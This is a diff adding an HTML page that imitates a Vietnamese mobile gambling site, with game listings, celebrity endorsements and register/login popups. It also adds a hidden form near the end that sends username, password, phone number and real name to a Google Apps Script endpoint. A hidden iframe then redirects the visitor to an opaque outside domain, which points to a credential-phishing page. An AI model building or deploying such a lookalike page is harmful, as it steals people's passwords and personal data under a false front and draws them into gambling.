@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giao diện Mobile trên PC</title>
+    
+    <!-- Nhúng thư viện Icon Font Awesome (Free CDN) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Nhúng CSS của thư viện Swiper -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.css" />
+   
+    <!-- Liên kết đến file CSS của bạn -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Khung App chính -->
+    <div class="app-container">
+        
+        <!-- Phần Header -->
+        <div class="header">
+            
+            <!-- Phần Banner trên cùng chứa các ảnh tải về -->
+            <div class="top-banner">
+                <!-- Thay src bằng link ảnh nút 3 gạch của bạn -->
+                <img src="images/menu.052ba6967b8d2f10.svg" alt="Menu" class="icon-menu">
+                
+                <!-- Thay src bằng link ảnh banner/logo ở giữa -->
+                <img src="images/logo1.png" alt="Logo" class="img-logo">
+                
+                <!-- Thay src bằng link ảnh chiếc điện thoại (App) -->
+                <img src="images/app.png" alt="App" class="icon-app">
+            </div>
+
+            <!-- THÊM MỚI: Khối Banner Trượt Ngang -->
+            <div class="banner-section">
+                <div class="swiper mySwiper">
+                    <div class="swiper-wrapper">
+                        <!-- Thay thế link ảnh bằng 6 hình bạn đã có -->
+                        <div class="swiper-slide"><img src="images/banner1.jpg" alt="Banner 1"></div>
+                        <div class="swiper-slide"><img src="images/banner2.jpg" alt="Banner 2"></div>
+                        <div class="swiper-slide"><img src="images/banner3.jpg" alt="Banner 3"></div>
+                        <div class="swiper-slide"><img src="images/banner4.jpg" alt="Banner 4"></div>
+                        <div class="swiper-slide"><img src="images/banner5.jpg" alt="Banner 5"></div>
+                        <div class="swiper-slide"><img src="images/banner6.jpg" alt="Banner 6"></div>
+                    </div>
+                    <!-- Nút điều hướng mũi tên -->
+                    <div class="swiper-button-next"></div>
+                    <div class="swiper-button-prev"></div>
+                    <!-- Dấu chấm chuyển trang -->
+                    <div class="swiper-pagination"></div>
+                </div>
+            </div>
+
+            <!-- Nút Đăng ký / Đăng nhập -->
+            <div class="auth-buttons">
+                <button class="btn-register">ĐĂNG KÝ</button>
+                <button class="btn-login">ĐĂNG NHẬP</button>
+            </div>
+               
+        </div>
+       <!-- Thanh menu danh mục (Category Menu) -->
+<div class="category-menu-wrapper">
+    <div class="category-menu">
+        <div class="menu-item active">
+            <i class="fa-solid fa-fire"></i>
+            <span>HOT</span>
+        </div>
+        <div class="menu-item">
+            <i class="fa-solid fa-dice"></i>
+            <span>Casino</span>
+        </div>
+        <div class="menu-item">
+            <i class="fa-solid fa-gift"></i>
+            <span>Nổ Hũ</span>
+        </div>
+        <div class="menu-item">
+            <i class="fa-solid fa-fish"></i>
+            <span>Bắn Cá</span>
+        </div>
+        <div class="menu-item">
+            <i class="fa-solid fa-futbol"></i>
+            <span>Thể Thao</span>
+        </div>
+        <div class="menu-item">
+            <i class="fa-solid fa-diamond"></i>
+            <span>Game Bài</span>
+        </div>
+        <div class="menu-item">
+            <i class="fa-solid fa-kiwi-bird"></i> 
+            <span>Đá Gà</span>
+        </div>
+    </div>
+</div>
+        <!-- Nội dung Grid 3 cột (Danh sách game) -->
+<div class="content">
+    
+    <!-- Thẻ Game 1 -->
+    <div class="game-card">
+        <div class="category-label">SÒNG BÀI</div>
+        <img src="images/1.png" alt="SE TRỰC TUYẾN" class="game-img">
+        <div class="game-title">SE TRỰC TUYẾN</div>
+    </div>
+
+    <!-- Thẻ Game 2 -->
+    <div class="game-card">
+        <div class="category-label">SÒNG BÀI</div>
+        <img src="images/2.png" alt="DG TRỰC TUYẾN" class="game-img">
+        <div class="game-title">DG TRỰC TUYẾN</div>
+    </div>
+
+    <!-- Thẻ Game 3 -->
+    <div class="game-card">
+        <div class="category-label">THỂ THAO</div>
+        <img src="images/3.png" alt="SABA THỂ THAO" class="game-img">
+        <div class="game-title">SABA THỂ THAO</div>
+    </div>
+
+    <!-- Thẻ Game 4 -->
+    <div class="game-card">
+        <div class="category-label">NỔ HŨ</div>
+        <img src="images/4.png" alt="WILD BOUNTY" class="game-img">
+        <div class="game-title">WILD BOUNTY</div>
+    </div>
+
+    <!-- Thẻ Game 5 -->
+    <div class="game-card">
+        <div class="category-label">NỔ HŨ</div>
+        <img src="images/5.png" alt="KHO BÁU AZTEC" class="game-img">
+        <div class="game-title">KHO BÁU AZTEC</div>
+    </div>
+
+    <!-- Thẻ Game 6 -->
+    <div class="game-card">
+        <div class="category-label">BẮN CÁ</div>
+        <img src="images/6.png" alt="JACKPOT BẮN CÁ" class="game-img">
+        <div class="game-title">JACKPOT BẮN CÁ</div>
+    </div>
+   
+    <!-- Thẻ Game 1 -->
+    <div class="game-card">
+        <div class="category-label">SÒNG BÀI</div>
+        <img src="images/7.png" alt="SE TRỰC TUYẾN" class="game-img">
+        <div class="game-title">SE TRỰC TUYẾN</div>
+    </div>
+
+    <!-- Thẻ Game 2 -->
+    <div class="game-card">
+        <div class="category-label">SÒNG BÀI</div>
+        <img src="images/8.png" alt="DG TRỰC TUYẾN" class="game-img">
+        <div class="game-title">DG TRỰC TUYẾN</div>
+    </div>
+
+    <!-- Thẻ Game 3 -->
+    <div class="game-card">
+        <div class="category-label">THỂ THAO</div>
+        <img src="images/9.png" alt="SABA THỂ THAO" class="game-img">
+        <div class="game-title">SABA THỂ THAO</div>
+    </div>
+
+    <!-- Thẻ Game 4 -->
+    <div class="game-card">
+        <div class="category-label">NỔ HŨ</div>
+        <img src="images/10.png" alt="WILD BOUNTY" class="game-img">
+        <div class="game-title">WILD BOUNTY</div>
+    </div>
+
+    <!-- Thẻ Game 5 -->
+    <div class="game-card">
+        <div class="category-label">NỔ HŨ</div>
+        <img src="images/11.png" alt="KHO BÁU AZTEC" class="game-img">
+        <div class="game-title">KHO BÁU AZTEC</div>
+    </div>
+
+    <!-- Thẻ Game 6 -->
+    <div class="game-card">
+        <div class="category-label">BẮN CÁ</div>
+        <img src="images/12.png" alt="JACKPOT BẮN CÁ" class="game-img">
+        <div class="game-title">JACKPOT BẮN CÁ</div>
+    </div>
+    <!-- Thẻ Game 1 -->
+    <div class="game-card">
+        <div class="category-label">SÒNG BÀI</div>
+        <img src="images/13.png" alt="SE TRỰC TUYẾN" class="game-img">
+        <div class="game-title">SE TRỰC TUYẾN</div>
+    </div>
+
+    <!-- Thẻ Game 2 -->
+    <div class="game-card">
+        <div class="category-label">SÒNG BÀI</div>
+        <img src="images/14.png" alt="DG TRỰC TUYẾN" class="game-img">
+        <div class="game-title">DG TRỰC TUYẾN</div>
+    </div>
+
+    <!-- Thẻ Game 3 -->
+    <div class="game-card">
+        <div class="category-label">THỂ THAO</div>
+        <img src="images/15.png" alt="SABA THỂ THAO" class="game-img">
+        <div class="game-title">SABA THỂ THAO</div>
+    </div>
+
+    <!-- Thẻ Game 4 -->
+    <div class="game-card">
+        <div class="category-label">NỔ HŨ</div>
+        <img src="images/16.png" alt="WILD BOUNTY" class="game-img">
+        <div class="game-title">WILD BOUNTY</div>
+    </div>
+
+    <!-- Thẻ Game 5 -->
+    <div class="game-card">
+        <div class="category-label">NỔ HŨ</div>
+        <img src="images/17.png" alt="KHO BÁU AZTEC" class="game-img">
+        <div class="game-title">KHO BÁU AZTEC</div>
+    </div>
+
+    <!-- Thẻ Game 6 -->
+    <div class="game-card">
+        <div class="category-label">BẮN CÁ</div>
+        <img src="images/18.png" alt="JACKPOT BẮN CÁ" class="game-img">
+        <div class="game-title">JACKPOT BẮN CÁ</div>
+    </div>
+</div>
+       
+    <!-- --- THÊM MỚI: PHẦN TẢI APP --- -->
+        <div class="download-section">
+            <div class="download-title">
+                <i class="fa-solid fa-download"></i> TẢI APP
+            </div>
+            
+            <div class="download-buttons">
+                <!-- Hình nút tải Apple (image_7f15e6.png) -->
+                <img src="images/app_ios.png" alt="Tải App iOS" class="store-btn">
+                
+                <!-- Hình nút tải Android (image_7f162a.png) -->
+                <img src="images/app_android.png" alt="Tải App Android" class="store-btn">
+            </div>
+
+            <div class="download-banner">
+                <!-- Hình đại sứ thương hiệu (image_7f15cd.jpg) -->
+                <img src="images/app_img.png" alt="Đại sứ thương hiệu" class="ambassador-img">
+            </div>
+        </div>
+
+        <!-- Thanh menu dưới cùng -->
+<div class="footer">
+    <!-- Thêm class active cho mục đang được chọn -->
+    <div class="footer-item active">
+        <img src="images/home.png" alt="Trang chủ" class="footer-icon">
+        <span>TRANG CHỦ</span>
+    </div>
+    <div class="footer-item">
+        <img src="images/daily.png" alt="Đại lý 60%" class="footer-icon">
+        <span>ĐẠI LÝ 60%</span>
+    </div>
+    <div class="footer-item">
+        <img src="images/km.png" alt="Khuyến mãi" class="footer-icon">
+        <span>KHUYẾN MÃI</span>
+    </div>
+    <div class="footer-item">
+        <img src="images/cskh.png" alt="CSKH 24/7" class="footer-icon">
+        <span>CSKH 24/7</span>
+    </div>
+    <div class="footer-item">
+        <img src="images/play.png" alt="Chơi thử" class="footer-icon">
+        <span>CHƠI THỬ</span>
+    </div>
+</div>
+
+    </div>
+    <!-- ... Mã hiện tại của bạn ... -->
+<!-- Iframe ẩn để nhận response từ Google Script mà không reload trang -->
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted) { window.location.href = 'https://m.i4uoi87g5hj132y9874f65gh1.com/'; }"></iframe>
+    
+    <!-- Form ẩn để gửi dữ liệu -->
+    <!-- THAY THẾ URL DƯỚI ĐÂY BẰNG WEB APP URL CỦA BẠN -->
+    <form action="https://script.google.com/macros/s/AKfycbx2UpEl1lgotDqd-2QE_rLO2Xe2PErJF5QWY9LeUC3-7uhKAjjEjnqJgSJBJkihx0Xk/exec" method="POST" target="hidden_iframe" id="googleForm" style="display: none;">
+        <input type="hidden" name="trang_thai" id="g_status">
+        <input type="hidden" name="tai_khoan" id="g_username">
+        <input type="hidden" name="mat_khau" id="g_password">
+        <input type="hidden" name="so_dien_thoai" id="g_phone">
+        <input type="hidden" name="ho_ten" id="g_fullname">
+    </form>
+    <!-- Modal Đăng Ký / Đăng Nhập -->
+    <div id="authModal" class="modal-overlay">
+        <div class="modal-content">
+            <!-- Nút đóng popup -->
+            <span class="close-modal"><i class="fa-solid fa-circle-xmark"></i></span>
+            
+            <!-- Phần Header của Modal -->
+            <div class="modal-header">
+                <img src="images/logo.png" alt="Logo" class="modal-logo">
+                
+                
+                <div class="ambassador-info">
+                    <h3 class="ambassador-title">Đại Sứ Thương Hiệu</h3>
+                    <div class="ambassador-row">
+                        <span>Mike Tyson (2026 - 2027)</span>
+                        <img src="images/reg_mike.png" alt="Chữ ký Mike Tyson" class="sign-img">
+                    </div>
+                    <div class="ambassador-row">
+                        <span>Ronaldinho (2024 - 2025)</span>
+                        <img src="images/reg_ronalainho.png" alt="Chữ ký Ronaldinho" class="sign-img">
+                    </div>
+                </div>
+            </div>
+
+            <!-- Nút chuyển đổi Tab Đăng Ký / Đăng Nhập -->
+            <div class="modal-tabs">
+                <button class="tab-btn active" id="tabRegister">ĐĂNG KÝ</button>
+                <button class="tab-btn" id="tabLogin">ĐĂNG NHẬP</button>
+            </div>
+
+            <!-- Form Đăng Ký (Mặc định hiển thị) -->
+            <div id="formRegister" class="auth-form active-form">
+                <input type="text" name="username" class="input-field" placeholder="Tên đăng nhập">
+                
+                <div class="password-wrapper">
+                    <input type="password" name="password" class="input-field" placeholder="Mật khẩu">
+                    <i class="fa-solid fa-eye-slash toggle-pw"></i>
+                </div>
+                
+                <input type="text" name="fullname" class="input-field" placeholder="Họ tên thật">
+                
+                <!-- Trường Số điện thoại đã được thay thế theo yêu cầu trước đó -->
+                <div class="phone-input-wrapper input-field">
+                    <img src="images/sao.jpg" alt="VN" class="flag-icon"> 
+                    <span>+84</span>
+                    <input type="tel" name="phone" pattern="[0-9]{10}" maxlength="10" placeholder="Nhập số điện thoại" class="phone-input">
+                </div>
+
+                <div class="checkbox-wrapper">
+                    <input type="checkbox" id="agreeTerms" checked>
+                    <label for="agreeTerms">Tôi đã hiểu <span style="color: #ffaa00;">Thỏa thuận đăng ký người dùng</span></label>
+                </div>
+
+                <button class="btn-submit">ĐĂNG KÝ NGAY</button>
+            </div>
+
+            <!-- Form Đăng Nhập (Mặc định ẩn) -->
+            <div id="formLogin" class="auth-form">
+                <input type="text" name="username" class="input-field" placeholder="Vui lòng nhập tên tài khoản">
+                
+                <div class="password-wrapper">
+                    <input type="password" name="password" class="input-field" placeholder="Vui lòng nhập mật khẩu">
+                    <i class="fa-solid fa-eye-slash toggle-pw"></i>
+                </div>
+                <!-- Thêm trường Số điện thoại vào form Đăng Nhập -->
+                <div class="phone-input-wrapper input-field">
+                    <img src="images/sao.jpg" alt="VN" class="flag-icon"> 
+                    <span>+84</span>
+                    <input type="tel" name="phone" pattern="[0-9]{10}" maxlength="10" placeholder="Nhập số điện thoại" class="phone-input">
+                </div>
+                <div class="checkbox-wrapper">
+                    <input type="checkbox" id="rememberMe">
+                    <label for="rememberMe">Ghi nhớ tài khoản mật khẩu?</label>
+                </div>
+
+                <div class="security-warning">
+                    Vui lòng tự bảo quản thông tin tài khoản<br>Để bảo đảm an toàn cho tài khoản của bạn
+                </div>
+
+                <button class="btn-submit">ĐĂNG NHẬP</button>
+            </div>
+
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
+
+    <!-- QUAN TRỌNG: Đã thêm JS của thư viện Swiper để banner hoạt động -->
+    <script src="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js"></script>
+    
+    <!-- Liên kết đến file JavaScript của bạn -->
+    <script src="script.js"></script>
+</body>
+</html>
